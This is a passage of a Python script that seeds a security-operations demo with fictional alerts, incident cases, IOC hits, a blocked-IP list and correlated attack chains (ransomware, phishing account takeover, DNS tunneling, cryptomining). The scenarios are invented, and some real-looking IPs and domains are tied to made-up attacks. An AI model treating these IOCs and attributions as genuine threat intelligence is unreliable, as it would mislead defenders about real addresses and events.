         "resolution": "互联网背景噪音，未发现利用。", "classification": "false_positive"},

    # ── 支线 F：数据外发与 DNS 隧道（处理中）────────────────────
    {"key": "exfil-upload-01", "h": 6, "source": "zeek", "event_type": "data_exfiltration",
         "severity": "high", "title": "Large outbound upload (2.3GB) to personal cloud storage from hr-laptop-wang",
         "description": "hr-laptop-wang（wang.xiaotong）在非工作时段向个人网盘 weshare-api.top 上传 2.3GB 数据，DLP 命中『员工个人信息』策略。",
         "src_ip": "192.168.20.22", "dst_ip": "43.155.132.88", "protocol": "HTTPS",
         "agent": "hr-laptop-wang",
         "mitre": "Exfiltration", "techniques": ["T1567.002"],
         "iocs": [{"type": "domain", "value": "weshare-api.top", "confidence": 78}],
         "full_log": '{"ts":"2026-10-10T06:12:08Z","id.orig_h":"192.168.20.22","host":"weshare-api.top","method":"PUT","upload_bytes":2469606198,"duration":1841.2}',
         "location": "/var/log/zeek/http.log", "status": "new",
         "threat_score": 83, "tags": ["dlp", "data-exfiltration", "insider-risk"]},
    {"key": "dns-tunnel-01", "h": 3, "source": "zeek", "event_type": "dns_tunneling",
         "severity": "high", "title": "High-entropy DNS TXT queries to 0xcd10e1.tech — suspected DNS tunneling",
         "description": "it-laptop-zhang 每秒 8-12 次 TXT 查询 0xcd10e1.tech，子域熵值 4.2，疑似 DNS 隧道外传数据或 C2 通道。",
         "src_ip": "192.168.10.21", "dst_ip": "10.0.1.1", "protocol": "DNS",
         "agent": "it-laptop-zhang",
         "mitre": "Command and Control, Exfiltration", "techniques": ["T1071.004"],
         "iocs": [{"type": "domain", "value": "0xcd10e1.tech", "confidence": 82}],
         "full_log": '{"ts":"2026-10-10T09:22:31Z","qtype_name":"TXT","query":"a8f3d1e0b2c4.0xcd10e1.tech","entropy":4.21,"qps":11}',
         "location": "/var/log/zeek/dns.log", "status": "new",
         "threat_score": 86, "tags": ["dns-tunneling", "c2"]},

    # ── 漏洞暴露面（Trivy 定时扫描）────────────────────────────
    {"key": "vuln-regression-01", "h": 30, "source": "trivy", "event_type": "vulnerability",
         "severity": "high", "title": "CVE-2024-6387 (regreSSHion) detected on jump-bastion-01",
         "description": "OpenSSH 9.2p1 存在 regreSSHion 竞态条件 RCE（CVSS 8.1），堡垒机为高价值资产，需尽快升级。",
         "dst_ip": "172.16.0.5", "agent": "jump-bastion-01", "rule_id": "trivy-cve", "rule_level": 8,
         "rule_groups": "vulnerability,openssh,rce",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "iocs": [{"type": "cve", "value": "CVE-2024-6387", "confidence": 100}],
         "status": "new", "threat_score": 80, "tags": ["vulnerability", "openssh"]},
    {"key": "vuln-citrix-01", "h": 12, "source": "trivy", "event_type": "vulnerability",
         "severity": "critical", "title": "CVE-2023-4966 (Citrix Bleed) detected on vpn-gw-01",
         "description": "NetScaler ADC 13.1 build < 49.15 存在会话令牌泄露漏洞（CVSS 9.4），已被多个勒索组织在野利用，VPN 网关暴露公网。",
         "dst_ip": "172.16.0.10", "agent": "vpn-gw-01", "rule_id": "trivy-cve", "rule_level": 10,
         "rule_groups": "vulnerability,citrix,auth_bypass",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "iocs": [{"type": "cve", "value": "CVE-2023-4966", "confidence": 100}],
         "status": "new", "threat_score": 90, "tags": ["vulnerability", "citrix", "zero-day-adjacent"]},
    {"key": "vuln-runc-01", "h": 55, "source": "trivy", "event_type": "vulnerability",
         "severity": "medium", "title": "CVE-2024-21626 (runc) detected on k8s-node-01/02",
         "description": "runc 1.1.10 存在工作目录泄露导致的容器逃逸漏洞（CVSS 8.6），集群版本较旧。",
         "dst_ip": "10.0.30.11", "agent": "k8s-node-01", "rule_id": "trivy-cve", "rule_level": 6,
         "rule_groups": "vulnerability,container,escape",
         "mitre": "Privilege Escalation", "techniques": ["T1611"],
         "iocs": [{"type": "cve", "value": "CVE-2024-21626", "confidence": 100}],
         "status": "investigating", "threat_score": 66, "tags": ["vulnerability", "kubernetes"]},
    {"key": "vuln-rapid-reset-01", "h": 80, "source": "trivy", "event_type": "vulnerability",
         "severity": "medium", "title": "CVE-2023-44487 (HTTP/2 Rapid Reset) exposure on api-gateway-01",
         "description": "Kong 网关前端 Nginx 启用 HTTP/2，存在 Rapid Reset DDoS 风险（CVSS 7.5），已通过 upstream 限流缓解。",
         "dst_ip": "10.0.10.20", "agent": "api-gateway-01", "rule_id": "trivy-cve", "rule_level": 5,
         "rule_groups": "vulnerability,ddos,http2",
         "iocs": [{"type": "cve", "value": "CVE-2023-44487", "confidence": 100}],
         "status": "resolved", "mttr_h": 4.0, "threat_score": 60, "tags": ["vulnerability", "ddos"],
         "resolution": "已启用 HTTP/2 并发流限制与 WAF 速率规则。",
         "remediation": "Nginx keepalive_requests 限额 + WAF flood 规则", "classification": "true_positive"},
    {"key": "vuln-log4j-01", "h": 300, "source": "trivy", "event_type": "vulnerability",
         "severity": "critical", "title": "CVE-2021-44228 (Log4Shell) detected on dev-jenkins-01",
         "description": "Jenkins 依赖 log4j-core 2.14.1，存在 JNDI 注入 RCE（CVSS 10.0）。",
         "dst_ip": "10.0.50.10", "agent": "dev-jenkins-01", "rule_id": "trivy-cve", "rule_level": 10,
         "rule_groups": "vulnerability,log4j,rce",
         "iocs": [{"type": "cve", "value": "CVE-2021-44228", "confidence": 100}],
         "status": "resolved", "mttr_h": 9.0, "threat_score": 88, "tags": ["vulnerability", "log4shell"],
         "resolution": "升级 log4j 2.17.1，全网复扫确认无残留。",
         "root_cause": "历史镜像未纳入依赖扫描流水线",
         "remediation": "CI 流水线加入 Trivy 镜像门禁", "classification": "true_positive"},

    # ── 终端与身份杂项 ────────────────────────────────────────
    {"key": "edr-quarantine-01", "h": 90, "source": "osquery", "event_type": "malware",
         "severity": "info", "title": "EDR: Trojan:JS/FakeUpdate quarantined on hr-laptop-wang",
         "description": "用户下载仿冒 Chrome 更新程序，EDR 实时防护自动隔离，无需人工处理。",
         "dst_ip": "192.168.20.22", "agent": "hr-laptop-wang", "rule_id": "edr-1191", "rule_level": 4,
         "rule_groups": "malware,quarantined",
         "mitre": "Execution", "techniques": ["T1204.002"],
         "status": "resolved", "mttr_h": 0.1, "threat_score": 20, "tags": ["malware", "auto-remediated"],
         "resolution": "EDR 自动隔离，样本已上传沙箱分析。", "classification": "true_positive"},
    {"key": "usb-dlp-01", "h": 70, "source": "osquery", "event_type": "usb_device",
         "severity": "low", "title": "USB storage device attached to fin-laptop-liu",
         "description": "财务终端接入未知 USB 存储设备（SanDisk Cruzer Blade），DLP 策略记录外拷行为。",
         "dst_ip": "192.168.20.15", "agent": "fin-laptop-liu", "rule_id": "osq-usb-4", "rule_level": 4,
         "rule_groups": "dlp,usb,endpoint",
         "mitre": "Exfiltration", "techniques": ["T1052.001"],
         "status": "new", "threat_score": 30, "tags": ["dlp", "usb"]},
    {"key": "logon-spike-01", "h": 40, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "Windows logon failure spike (4625 x 34) on dc-dc01",
         "description": "dc-dc01 出现针对账户 administrator 的密码喷洒式登录失败（34 次/10 分钟），来源为内网 IP 192.168.10.21。",
         "src_ip": "192.168.10.21", "dst_ip": "10.0.1.10",
         "agent": "dc-dc01", "rule_id": "60106", "rule_level": 10,
         "rule_groups": "windows,authentication_failures,password_spraying",
         "mitre": "Credential Access", "techniques": ["T1110.003"],
         "status": "investigating", "threat_score": 72, "tags": ["password-spraying", "insider-suspect"]},
    {"key": "mail-rule-01", "h": 33, "source": "office365", "event_type": "email_rule",
         "severity": "medium", "title": "Suspicious inbox rule created: auto-forward to external address",
         "description": "hr 部账户 wang.xiaotong@acme-corp.cn 新建收件箱规则，将含『工资|薪资|offer』关键字的邮件自动转发至外部邮箱。",
         "agent": "mail-exch-01",
         "mitre": "Collection", "techniques": ["T1114.003"],
         "iocs": [{"type": "email", "value": "hr.data.2026@weshare-api.top", "confidence": 80}],
         "full_log": '{"Operation":"New-InboxRule","UserId":"wang.xiaotong@acme-corp.cn","ForwardTo":"hr.data.2026@weshare-api.top","Conditions":["工资","薪资","offer"]}',
         "location": "O365 Audit Log (New-InboxRule)", "status": "new",
         "threat_score": 76, "tags": ["persistence", "email-forwarding", "insider-risk"]},
    {"key": "audit-policy-01", "h": 130, "source": "wazuh", "event_type": "audit_change",
         "severity": "info", "title": "Audit policy changed on dc-dc02",
         "description": "辅助域控的审核策略新增『进程创建』审计项，确认为变更单 CHG-2026-1024 内的合规加固。",
         "dst_ip": "10.0.1.11", "agent": "dc-dc02", "rule_id": "6114", "rule_level": 4,
         "rule_groups": "windows,audit_policy",
         "mitre": "Defense Evasion", "techniques": ["T1562.001"],
         "status": "resolved", "mttr_h": 1.0, "threat_score": 10, "tags": ["audit", "change-verified"],
         "resolution": "与变更管理记录匹配，正常加固。", "classification": "false_positive"},
    {"key": "root-login-01", "h": 200, "source": "cloudtrail", "event_type": "cloud_audit",
         "severity": "info", "title": "Root account console login (MFA) from known corporate IP",
         "description": "AWS root 账户从公司出口 IP 登录，MFA 校验通过，确认为季度费用核查。",
         "src_ip": "203.0.113.50",
         "mitre": "", "techniques": [],
         "status": "false_positive", "mttr_h": 0.2, "threat_score": 15, "tags": ["cloud", "root-account"],
         "resolution": "与运维值班记录匹配。", "classification": "false_positive"},
]


def build_story_alerts() -> list[SecurityAlert]:
    alerts = []
    for spec in ALERT_SPECS:
        created = ago(hours=spec["h"])
        mitre_tactics = [t.strip() for t in spec.get("mitre", "").split(",") if t.strip()]
        status = spec["status"]
        alert = SecurityAlert(
            source=spec["source"],
            external_event_id=f"DEMO-{spec['key'].upper()}",
            event_type=spec["event_type"],
            severity=spec["severity"],
            title=spec["title"],
            description=spec["description"],
            source_ip=spec.get("src_ip"),
            destination_ip=spec.get("dst_ip"),
            protocol=spec.get("protocol"),
            agent_name=spec.get("agent"),
            agent_id=uid("agent", spec.get("agent", "unknown"))[:12] if spec.get("agent") else None,
            agent_ip=spec.get("dst_ip"),
            rule_id=spec.get("rule_id"),
            rule_level=spec.get("rule_level"),
            rule_groups=spec.get("rule_groups"),
            rule_mitre=",".join(mitre_tactics),
            full_log=spec.get("full_log"),
            location=spec.get("location"),
            geoip=geoip(spec.get("src_ip") or ""),
            raw_data={"demo": True, "event_key": spec["key"]},
            status=status,
            assigned_to="admin" if status in ("investigating", "resolved", "escalated") else None,
            assigned_at=created + timedelta(minutes=15) if status in ("investigating", "resolved", "escalated") else None,
            resolution_note=spec.get("resolution"),
            root_cause=spec.get("root_cause"),
            remediation=spec.get("remediation"),
            resolved_at=ago(hours=spec["h"] - spec["mttr_h"]) if spec.get("mttr_h") else None,
            resolved_by="admin" if spec.get("mttr_h") else None,
            escalated_to=spec.get("escalated_to"),
            escalated_at=created + timedelta(minutes=30) if spec.get("escalated_to") else None,
            escalation_reason=spec.get("esc_reason"),
            threat_score=spec.get("threat_score"),
            enriched_at=created + timedelta(minutes=2) if spec.get("iocs") else None,
            iocs=spec.get("iocs"),
            mitre_tactics=mitre_tactics or None,
            mitre_techniques=spec.get("techniques") or None,
            tags=spec.get("tags"),
            classification=spec.get("classification"),
            fingerprint=sha(f"{spec['source']}|{spec['event_type']}|{spec.get('src_ip')}"),
            aggregated_count=spec.get("agg", 1),
            last_seen_at=created + timedelta(minutes=6) if spec.get("agg", 1) > 1 else created,
            is_aggregated=1 if spec.get("agg", 1) > 1 else 0,
            created_at=created,
            updated_at=created,
            event_timestamp=created,
        )
        alerts.append(alert)
    return alerts


def build_noise_alerts() -> list[SecurityAlert]:
    """生成 14 天内的例行低危噪音（扫描、失败登录、背景告警）。"""
    alerts = []
    scan_ips = ["196.52.43.54", "5.188.206.130", "118.25.6.39", "222.186.18.35", "141.98.10.60"]
    web_agents = ["web-prod-01", "web-prod-02", "api-gateway-01"]

    for i in range(28):  # 端口扫描
        hour = 6 + i * 11.7
        src = scan_ips[i % len(scan_ips)]
        agent = web_agents[i % len(web_agents)]
        created = ago(hours=hour)
        resolved = i % 3 == 0
        alerts.append(SecurityAlert(
            source="suricata", external_event_id=f"DEMO-NOISE-SCAN-{i:02d}",
            event_type="reconnaissance", severity="low",
            title="ET SCAN Suspicious inbound to database / management ports",
            description=f"来自 {src} 的端口扫描（445/3306/5432/6379），无后续利用行为。",
            source_ip=src, destination_ip="10.0.10.11", protocol="TCP",
            agent_name=agent, rule_id="2019241", rule_level=3,
            rule_groups="scan,recon", mitre_tactics="Discovery", mitre_techniques=["T1046"],
            geoip=geoip(src), location="/var/log/suricata/eve.json",
            status="resolved" if resolved else "false_positive",
            resolution_note="已加入黑洞路由。" if resolved else "背景扫描噪音。",
            resolved_by="admin" if resolved else None,
            resolved_at=ago(hours=hour - 0.1) if resolved else None,
            threat_score=12, classification="false_positive",
            tags=["scan", "noise"], aggregated_count=4 + i % 9,
            last_seen_at=created + timedelta(minutes=9),
            is_aggregated=1,
            fingerprint=sha(f"scan|{src}"), created_at=created, updated_at=created,
            event_timestamp=created,
        ))

    for i in range(18):  # SSH 非存在用户 / 认证失败
        hour = 4 + i * 18.3
        src = scan_ips[(i + 2) % len(scan_ips)]
        created = ago(hours=hour)
        alerts.append(SecurityAlert(
            source="wazuh", external_event_id=f"DEMO-NOISE-AUTH-{i:02d}",
            event_type="brute_force", severity="low",
            title="SSHD: Attempt to login using a non-existent user",
            description=f"针对不存在账户的 SSH 登录尝试，来源 {src}。",
            source_ip=src, destination_ip="172.16.0.5", protocol="TCP",
            agent_name="jump-bastion-01", rule_id="5710", rule_level=5,
            rule_groups="sshd,authentication_failures",
            mitre_tactics="Credential Access", mitre_techniques=["T1110.001"],
            geoip=geoip(src), location="/var/log/auth.log",
            status="false_positive",
            resolution_note="互联网背景噪音，fail2ban 自动处置。",
            threat_score=8, classification="false_positive",
            tags=["ssh", "noise"], aggregated_count=6 + i % 15,
            last_seen_at=created + timedelta(minutes=3), is_aggregated=1,
            fingerprint=sha(f"auth|{src}"), created_at=created, updated_at=created,
            event_timestamp=created,
        ))

    for i in range(9):  # 终端防护自动处置
        hour = 10 + i * 36
        agents = ["hr-laptop-wang", "fin-laptop-liu", "it-laptop-zhang"]
        created = ago(hours=hour)
        alerts.append(SecurityAlert(
            source="osquery", external_event_id=f"DEMO-NOISE-EDR-{i:02d}",
            event_type="malware", severity="info",
            title="EDR: potentially unwanted program blocked in real-time",
            description="捆绑安装器/广告插件被实时防护阻断，无需人工处理。",
            destination_ip="192.168.20.22", agent_name=agents[i % 3],
            rule_id="edr-pua", rule_level=3, rule_groups="malware,quarantined",
            status="resolved", resolution_note="EDR 自动处置。",
            resolved_by="admin", resolved_at=created + timedelta(minutes=1),
            threat_score=5, classification="true_positive", tags=["edr", "noise"],
            created_at=created, updated_at=created, event_timestamp=created,
        ))

    return alerts


# ────────────────────────────────────────────────────────────────────
# 案例（含时间线 / 评论 / SLA）
# ────────────────────────────────────────────────────────────────────

CASES: list[dict] = [
    {"key": "ransomware", "title": "疑似勒索软件攻击：文件服务器批量加密事件",
         "description": "it-laptop-zhang 疑似失陷（Cobalt Strike C2）后经 PsExec 横向移动至 filesrv-01，执行卷影删除与批量加密。域控出现可疑管理员账户，正在应急响应中。",
         "severity": "critical", "status": "investigating", "assign": "admin",
         "created_h": 26, "sla_h": 4,  # SLA 4h → 当前已超期
         "alert_keys": ["c2-beacon-01", "lsass-01", "newadmin-01", "psexec-01", "vssdel-01", "ransom-fim-01"],
         "timeline": [
             ("status_change", "升级为 P1 事件，启动应急响应流程，同步上报安全负责人", None),
             ("assignment", "事件分配给 admin 跟进处置", None),
         ],
         "comments": [
             ("admin", 25, "已将 filesrv-01 与 it-laptop-zhang 网络隔离（交换机端口 shutdown），C2 IP 209.141.35.17 已全网封禁。"),
             ("admin", 22, "备份核查：backup-nas-01 快照完好（最后快照 22:00），勒索样本未触及备份网段。已通知暂停全部 SMB 写入。"),
             ("wang.fang", 20, "财务共享目录受影响清单已导出：3,214 个文件 / 41 个部门目录。已要求全员暂停使用共享盘，改用临时协作空间。"),
         ]},
    {"key": "phishing", "title": "钓鱼邮件致财务人员凭据泄露与云控制台滥用",
         "description": "财务部 12 人收到仿冒 SSO 钓鱼邮件，liu.yiming 点击并提交凭据。随后该账户出现不可能 travel 登录、新增 IAM 密钥与 S3 桶公开等云上滥用行为。",
         "severity": "high", "status": "investigating", "assign": "admin",
         "created_h": 74, "sla_h": 8,
         "alert_keys": ["phish-email-01", "phish-click-01", "ident-impossible-01", "cloud-iam-key-01", "cloud-s3-public-01"],
         "timeline": [
             ("status_change", "确认账户接管，事件升级并通知云平台管理员", None),
         ],
         "comments": [
             ("admin", 48, "已吊销 liu.yiming 全部会话令牌并强制重置密码 + 重注册 MFA；finance-readonly 的新增密钥已删除。"),
             ("admin", 46, "finance-exports 桶已恢复私有，CloudTrail 未发现批量 GetObject 下载记录，泄露影响待评估。"),
         ]},
    {"key": "vpn-bruteforce", "title": "堡垒机 SSH 持续暴力破解攻击",
         "description": "近两周多源 IP 对堡垒机 SSH 管理接口持续爆破，fail2ban 自动封禁，未发现成功登入。已加固为密钥认证。",
         "severity": "medium", "status": "resolved", "assign": "admin",
         "created_h": 13 * 24 + 6, "sla_h": 24, "resolved": True,
         "alert_keys": ["bf-01", "bf-02", "bf-03", "bf-04", "bf-05"],
         "timeline": [
             ("status_change", "fail2ban 连续触发封禁，开启专项跟踪", None),
             ("assignment", "分配给 admin 持续观察", None),
             ("resolution", "14 天内 5 波爆破全部自动封禁；确认无成功登入后结案", None),
         ],
         "comments": [
             ("admin", 6 * 24, "本周爆破源新增 2 个 IP，均已封禁。建议尽快关闭密码认证（跟踪单 TICK-4182）。"),
         ]},
    {"key": "cryptomining", "title": "K8s 集群挖矿木马（XMRig）事件",
         "description": "攻击者通过 Jenkins 未授权 API 在预发节点部署挖矿容器，安装 cron 持久化。已清理并加固。",
         "severity": "medium", "status": "resolved", "assign": "admin",
         "created_h": 122, "sla_h": 12, "resolved": True,
         "alert_keys": ["miner-pool-01", "miner-proc-01", "miner-cron-01"],
         "timeline": [
             ("status_change", "根因定位：Jenkins 8080 未授权访问", None),
             ("resolution", "恶意容器与 cron 已清理，Jenkins 已启用认证，结案", None),
         ],
         "comments": [
             ("chen.hao", 118, "预发节点镜像层已重建，Jenkins 端口改为仅研发网段可达。"),
         ]},
    {"key": "web-attack", "title": "Web 应用 SQL 注入与扫描探测",
         "description": "外部扫描器对商城 Web 层进行批量 SQL 注入与目录扫描，WAF 全部拦截，无实际渗透。",
         "severity": "low", "status": "closed", "assign": "admin",
         "created_h": 188, "sla_h": 24, "resolved": True, "closed": True,
         "alert_keys": ["sqli-01", "sqli-02", "sqli-03", "nmap-web-01", "log4shell-01"],
         "timeline": [
             ("status_change", "确认自动化扫描活动，按例行 WAF 事件处理", None),
             ("resolution", "扫描源封禁；Log4j 组件完成升级复扫；结案", None),
         ],
         "comments": []},
    {"key": "data-exfil", "title": "疑似敏感数据外发至个人网盘",
         "description": "hr-laptop-wang 非工作时段向个人网盘上传 2.3GB；同网段 it-laptop-zhang 出现 DNS 隧道特征。待 HR 与法务联合定性。",
         "severity": "high", "status": "pending_review", "assign": None,
         "created_h": 6, "sla_h": 8,
         "alert_keys": ["exfil-upload-01", "dns-tunnel-01", "mail-rule-01"],
         "timeline": [
             ("status_change", "与邮箱自动转发规则关联，合并调查", None),
         ],
         "comments": [
             ("admin", 4, "已导出 DLP 命中明细与代理日志，等待 HR 确认 wang.xiaotong 近期离职意向。"),
         ]},
]

IOC_HITS: list[dict] = [
    # (key, ioc_type, ioc_value, confidence, source, asset, context, notes, hours_ago)
    ("ioc-1", "ip", "209.141.35.17", 96, "alienvault-otx", "it-laptop-zhang",
     "Cobalt Strike C2 心跳目标，IT 运维终端外连", "已全网封禁，检索同类流量", 25),
    ("ioc-2", "ip", "45.155.205.233", 93, "abuseipdb", "jump-bastion-01",
     "SSH 暴力破解与 Log4Shell 利用来源，AbuseIPDB 置信度 100", "永久封禁", 13 * 24),
    ("ioc-3", "ip", "222.186.18.35", 88, "abuseipdb", "jump-bastion-01",
     "国内 IDC 段高频爆破源", "永久封禁", 9 * 24),
    ("ioc-4", "ip", "91.240.118.172", 85, "alienvault-otx", "k8s-node-03",
     "Monero 矿池解析 IP / 暴力破解双重恶意", "封禁", 5 * 24),
    ("ioc-5", "ip", "43.155.132.88", 90, "internal-detection", "fin-laptop-liu",
     "钓鱼页宿主 + 异常 Azure AD 登录地（新加坡）", "关注关联云事件", 50),
    ("ioc-6", "ip", "196.52.43.54", 72, "abuseipdb", "web-prod-01",
     "扫描器流量来源，无利用行为", "低置信度，观察", 8 * 24),
    ("ioc-7", "domain", "mail-verify-secure-login.com", 92, "phishtank", "fin-laptop-liu",
     "仿冒 SSO 钓鱼域名（【发票异常】邮件主题）", "已提交 takedown", 3 * 24),
    ("ioc-8", "domain", "update-cdn-service-cdn.xyz", 88, "internal-detection", "dev-jenkins-01",
     "挖矿持久化脚本下载域名", "DNS 拦截", 5 * 24),
    ("ioc-9", "domain", "pool.supportxmr.top", 85, "alienvault-otx", "k8s-node-03",
     "XMRig 默认矿池域名", "DNS 拦截", 5 * 24),
    ("ioc-10", "domain", "0xcd10e1.tech", 82, "internal-detection", "it-laptop-zhang",
     "DNS 隧道目标域，TXT 子域熵值 4.2", "调查中，已抓包", 3),
    ("ioc-11", "domain", "weshare-api.top", 78, "internal-detection", "hr-laptop-wang",
     "个人网盘 API 域名，DLP 外发目标", "联合 HR 定性中", 6),
    ("ioc-12", "domain", "cdn-status-telegram.xyz", 74, "alienvault-otx", None,
     "疑似 Cobalt Strike 备用 profile 域名", "全网 DNS 日志回溯 7 天", 25),
    ("ioc-13", "url", "http://mail-verify-secure-login.com/sso/auth.html", 92, "phishtank", "fin-laptop-liu",
     "钓鱼凭据收集页", "已截图取证", 3 * 24),
    ("ioc-14", "url", "http://update-cdn-service-cdn.xyz/init.sh", 86, "internal-detection", "dev-jenkins-01",
     "cron 下载的恶意脚本 URL", "样本已入库", 5 * 24),
    ("ioc-15", "email", "billing@invoice-notify.net", 95, "phishtank", "mail-exch-01",
     "钓鱼发件人（SPF 软失败）", "邮件网关已加黑", 3 * 24),
    ("ioc-16", "email", "hr.data.2026@weshare-api.top", 80, "internal-detection", "mail-exch-01",
     "邮箱自动转发规则的外部收件地址", "与数据外发案关联", 33),
    ("ioc-17", "sha256", sha("ransomware-lockbit-variant-sample"), 94, "internal-edr", "filesrv-01",
     "勒索信内嵌解密器样本（LockBit 3.0 变体）", "已提交沙箱：加密 + vssdel 行为", 20),
    ("ioc-18", "sha256", sha("mimikatz-sample-dc-dc01"), 91, "internal-edr", "dc-dc01",
     "rundll32 注入模块哈希（Mimikatz 特征）", "比对 VT 命中 58/70", 24),
    ("ioc-19", "sha256", sha("encrypt_helper-binary"), 89, "internal-edr", "filesrv-01",
     "PsExec 投递的 encrypt_helper.exe", "样本已隔离", 22),
    ("ioc-20", "sha256", sha("kdevtmpfsi-xmrig-binary"), 87, "internal-edr", "k8s-node-03",
     "XMRig 挖矿二进制 kdevtmpfsi", "已清理", 5 * 24),
    ("ioc-21", "sha256", sha("fakeupdate-chrome-installer"), 65, "virustotal", "hr-laptop-wang",
     "仿冒 Chrome 更新程序（Trojan:JS/FakeUpdate）", "EDR 自动隔离", 90),
    ("ioc-22", "ip", "5.188.206.130", 83, "abuseipdb", "vpn-gw-01",
     "VPN 管理接口爆破源", "封禁", 3 * 24),
    ("ioc-23", "ip", "141.98.10.60", 81, "abuseipdb", "jump-bastion-01",
     "低速爆破（low-and-slow）来源", "封禁", 6 * 24),
    ("ioc-24", "domain", "mail-verify-secure-login.com", 92, "phishtank", "mail-exch-01",
     "同上钓鱼域名（邮件网关视角）", "12 封邮件已撤回 9 封", 3 * 24),
    ("ioc-25", "ip", "185.220.101.45", 70, "abuseipdb", "jump-bastion-01",
     "Tor 出口节点爆破", "Tor 节点段整体限速", 20),
    ("ioc-26", "ip", "103.4.217.168", 77, "abuseipdb", "jump-bastion-01",
     "持续性 SSH 爆破（进行中）", "封禁", 4),
    ("ioc-27", "cve", "CVE-2023-4966", 100, "trivy", "vpn-gw-01",
     "Citrix Bleed 会话令牌泄露（CVSS 9.4）", "升级窗口已排期今晚", 12),
    ("ioc-28", "cve", "CVE-2024-6387", 100, "trivy", "jump-bastion-01",
     "regreSSHion 竞态 RCE（CVSS 8.1）", "待升级 OpenSSH 9.8p1", 30),
    ("ioc-29", "cve", "CVE-2024-21626", 100, "trivy", "k8s-node-01",
     "runc 容器逃逸（CVSS 8.6）", "随集群 1.29 升级修复", 55),
    ("ioc-30", "cve", "CVE-2023-44487", 100, "trivy", "api-gateway-01",
     "HTTP/2 Rapid Reset（CVSS 7.5）", "已缓解（限流）", 80),
]

BLOCKED_IPS: list[dict] = [
    # (value, reason, source, alert_key, expires_days or None, active)
    ("45.155.205.233", "SSH 暴力破解 + Log4Shell 利用尝试（DEMO-BF-01 / DEMO-LOG4SHELL-01）", "manual", "bf-01", None, True),
    ("209.141.35.17", "Cobalt Strike C2 心跳目标（DEMO-C2-BEACON-01）", "manual", "c2-beacon-01", None, True),
    ("222.186.18.35", "堡垒机高频 SSH 爆破（DEMO-BF-03）", "auto-response", "bf-03", None, True),
    ("91.240.118.172", "矿池通信 + 密码喷洒（DEMO-MINER-POOL-01）", "auto-response", "miner-pool-01", None, True),
    ("5.188.206.130", "VPN 管理接口爆破（DEMO-BF-05）", "manual", "bf-05", 30, True),
    ("196.52.43.54", "Web 扫描噪音（DEMO-SQLI-01）", "manual", "sqli-01", 7, False),
    ("185.220.101.45", "Tor 出口节点爆破（DEMO-BF-06）", "auto-response", "bf-06", 90, True),
    ("43.155.132.88", "钓鱼页宿主 / 异常云登录（DEMO-PHISH-CLICK-01）", "manual", "phish-click-01", None, True),
]

CORRELATED_EVENTS: list[dict] = [
    {"key": "ce-ransomware", "rule_id": "rule-ransomware-chain",
         "title": "勒索软件部署链：C2 → 凭据窃取 → 横向移动 → 批量加密",
         "description": "同一攻击链路的多阶段事件聚合：失陷终端外连 C2、域控凭据窃取、新增可疑管理员、PsExec 横向移动、卷影删除与 3,214 个文件加密。",
         "severity": "critical", "attack_type": "ransomware", "confidence": 0.94, "risk": 97.5,
         "alert_keys": ["c2-beacon-01", "lsass-01", "newadmin-01", "psexec-01", "vssdel-01", "ransom-fim-01"],
         "entities": {"source_ips": ["192.168.10.21", "209.141.35.17"], "users": ["zhang.wei", "svc_backup$"], "hosts": ["it-laptop-zhang", "dc-dc01", "filesrv-01"]},
         "first_h": 26, "last_h": 20, "status": "investigating", "assign": "admin",
         "tactics": ["Command and Control", "Credential Access", "Lateral Movement", "Impact"],
         "techniques": ["T1071.001", "T1003.001", "T1136.001", "T1021.002", "T1490", "T1486"],
         "summary": "高置信度判定为 LockBit 3.0 变体勒索攻击：初始载荷新闻型钓鱼/供应链途径待溯源，当前已进入加密阶段。关键点：攻击者在 6 小时内完成从单点失陷到域内横向移动，域控凭据可能已泄露。",
         "remediation": "1) 立即隔离 filesrv-01 与 it-laptop-zhang；2) 域管凭据全量轮换；3) 从 backup-nas-01 离线快照恢复；4) 全网排查 encrypt_helper.exe 与 svc_backup$ 账户。",
         "assets": ["it-laptop-zhang", "dc-dc01", "filesrv-01"], "users": ["zhang.wei"],
         "impact": "财务共享目录 3,214 个文件被加密；若恢复失败预计影响月结流程 3-5 个工作日。"},
    {"key": "ce-phishing-cloud", "rule_id": "rule-account-takeover",
         "title": "账户接管与云控制台滥用（钓鱼凭据 → Impossible Travel → IAM/S3 操作）",
         "description": "钓鱼凭据泄露后 12 分钟内发生异常地理登录、IAM 密钥创建与 S3 桶公开化，时序强关联。",
         "severity": "high", "attack_type": "account_takeover", "confidence": 0.91, "risk": 89.0,
         "alert_keys": ["phish-email-01", "phish-click-01", "ident-impossible-01", "cloud-iam-key-01", "cloud-s3-public-01"],
         "entities": {"source_ips": ["43.155.132.88"], "users": ["liu.yiming@acme-corp.cn"]},
         "first_h": 74, "last_h": 47, "status": "investigating", "assign": "admin",
         "tactics": ["Initial Access", "Persistence", "Collection"],
         "techniques": ["T1566.002", "T1078.004", "T1136.003", "T1530"],
         "summary": "典型钓鱼→ATO→云上持久化链路。攻击者未修改密码（避免触发告警），仅添加长期密钥，行为隐蔽。",
         "remediation": "吊销会话与密钥、重置凭据、复查 CloudTrail 90 天日志中该账户全部 API 调用。",
         "assets": ["fin-laptop-liu"], "users": ["liu.yiming@acme-corp.cn"],
         "impact": "finance-exports 桶短暂公开约 40 分钟，暂未发现批量下载记录。"},
    {"key": "ce-bruteforce", "rule_id": "rule-bruteforce-cluster",
         "title": "多源 SSH 暴力破解集群（14 天 5 波）",
         "description": "5 个独立来源针对堡垒机/VPN 的爆破行为聚簇，节奏与僵尸网络轮换特征一致。",
         "severity": "medium", "attack_type": "brute_force", "confidence": 0.82, "risk": 58.0,
         "alert_keys": ["bf-01", "bf-03", "bf-04", "bf-05", "bf-06", "bf-07"],
         "entities": {"source_ips": ["45.155.205.233", "222.186.18.35", "141.98.10.60", "5.188.206.130", "185.220.101.45", "103.4.217.168"]},
         "first_h": 13 * 24 + 6, "last_h": 4, "status": "resolved", "assign": "admin",
         "tactics": ["Credential Access"], "techniques": ["T1110.001", "T1110.003"],
         "summary": "全部攻击被 fail2ban 自动封禁，无成功登入。45.155.205.233 同时参与 Log4Shell 利用，具有混合攻击能力。",
         "remediation": "关闭 SSH 密码认证；爆破源网段批量加入黑名单。",
         "assets": ["jump-bastion-01", "vpn-gw-01"], "users": [],
         "impact": "无实际影响，管理面暴露面待收敛。"},
    {"key": "ce-cryptomining", "rule_id": "rule-crypto-mining",
         "title": "K8s 预发节点挖矿活动聚簇",
